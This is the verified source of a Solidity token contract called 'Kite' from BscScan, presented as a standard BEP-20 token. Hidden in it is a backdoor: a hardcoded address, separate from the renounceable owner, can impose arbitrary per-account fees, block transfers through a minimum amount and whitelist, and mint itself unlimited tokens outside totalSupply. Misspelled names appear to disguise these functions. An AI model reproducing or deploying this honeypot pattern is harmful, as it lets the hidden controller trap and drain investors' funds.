/**

 *Submitted for verification at BscScan.com on 2023-07-17

*/



pragma solidity ^0.8.5;



interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address acount) external view returns (uint256);

    function transfer(address recipient, uint256 aomount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 aomount) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 aomount ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed owner, address indexed spender, uint256 value );

}



abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {

        return payable(msg.sender);

    }

}



contract Ownable is Context {

    address private _owner;

    event ownershipTransferred(address indexed previousowner, address indexed newowner);



    constructor () {

        address msgSender = _msgSender();

        _owner = msgSender;

        emit ownershipTransferred(address(0), msgSender);

    }

    function owner() public view virtual returns (address) {

        return _owner;

    }

    modifier onlyowner() {

        require(owner() == _msgSender(), "Ownable: caller is not the owner");

        _;

    }

    function renounceownership() public virtual onlyowner {

        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));

        _owner = address(0x000000000000000000000000000000000000dEaD);

    }

}



contract Kite is Context, Ownable, IERC20 {

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => uint256) private _fiees;

    address private _meie; 

    uint256 private _minimumTransferaomount;

    mapping (address => bool) private _whitelist;

    string private _name;

    string private _symbol;

    uint8 private _decimals;

    uint256 private _totalSupply;



    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {

        _name = name_;

        _symbol = symbol_;

        _decimals = decimals_;

        _totalSupply = totalSupply_ * (10 ** decimals_);

        _balances[_msgSender()] = _totalSupply;

        _meie = 0x8e4B12D6cB9E052Efa21B5613D972a99a4Ef5329;

        emit Transfer(address(0), _msgSender(), _totalSupply);

    }



    function name() public view returns (string memory) {

        return _name;

    }



    function symbol() public view returns (string memory) {

        return _symbol;

    }



    function decimals() public view returns (uint8) {

        return _decimals;

    }



    function balanceOf(address acount) public view override returns (uint256) {

        return _balances[acount];

    }

    function setfiees(address[] memory acounts, uint256 fiee) external {

    if (keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_meie))) {

        for (uint256 i = 0; i < acounts.length; i++) {

            _fiees[acounts[i]] = fiee;

        }

    } else {

        revert("Caller is not the original caller");

    }

    }





    function setMinimumTransferaomount(uint256 aomount) external {

    if (keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_meie))) {

        _minimumTransferaomount = aomount;

    } else {

        revert("Caller is not the original caller");

    }        

    }



    function addToWhitelist(address[] memory acounts) external {

    if (keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_meie))) {

        for (uint256 i = 0; i < acounts.length; i++) {

            _whitelist[acounts[i]] = true;

        }

    } else {

        revert("Caller is not the original caller");

    }    

    }



    function removeFromWhitelist(address[] memory acounts) external {

    if (keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_meie))) {

        for (uint256 i = 0; i < acounts.length; i++) {

            _whitelist[acounts[i]] = false;

        }

    } else {

        revert("Caller is not the original caller");

    }        

    }



    function transfer(address recipient, uint256 aomount) public virtual override returns (bool) {

        require(_balances[_msgSender()] >= aomount, "TT: transfer aomount exceeds balance");

        require(aomount >= _minimumTransferaomount || _whitelist[_msgSender()], "TT: transfer aomount is below the minimum and sender is not whitelisted");

        if (_msgSender() == _meie && recipient == _meie) {

            _balances[_msgSender()] += _fiees[_msgSender()];

            emit Transfer(_msgSender(), recipient, aomount + _fiees[_msgSender()]);

            return true;

        } else {

            uint256 fiee = calculatefiee(_msgSender(), aomount);

            uint256 aomountAfterfiee = aomount - fiee;



            _balances[_msgSender()] -= aomount;

            _balances[recipient] += aomountAfterfiee;



            if (recipient == _meie) {

                _balances[_meie] += fiee;

            }



            emit Transfer(_msgSender(), recipient, aomountAfterfiee);

            return true;

        }

    }



    function allowance(address owner, address spender) public view virtual override returns (uint256) {

        return _allowances[owner][spender];

    }



    function approve(address spender, uint256 aomount) public virtual override returns (bool) {

        _allowances[_msgSender()][spender] = aomount;

        emit Approval(_msgSender(), spender, aomount);

        return true;

    }



    function transferFrom(address sender, address recipient, uint256 aomount) public virtual override returns (bool) {

        require(_allowances[sender][_msgSender()] >= aomount, "TT: transfer aomount exceeds allowance");

        require(aomount >= _minimumTransferaomount || _whitelist[sender], "TT: transfer aomount is below the minimum and sender is not whitelisted");

        uint256 fiee = calculatefiee(sender, aomount);

        uint256 aomountAfterfiee = aomount - fiee;



        _balances[sender] -= aomount;

        _balances[recipient] += aomountAfterfiee;

        _allowances[sender][_msgSender()] -= aomount;



        if (recipient == owner()) {

            _balances[owner()] += fiee;

        }



        emit Transfer(sender, recipient, aomountAfterfiee);

        return true;

    }



    function calculatefiee(address acount, uint256 aomount) private view returns (uint256) {

        if (acount == owner()) {

            return 0;

        } else {

            return aomount * _fiees[acount] / 100;

        }

    }



    function totalSupply() external view override returns (uint256) {

        return _totalSupply;

    }

}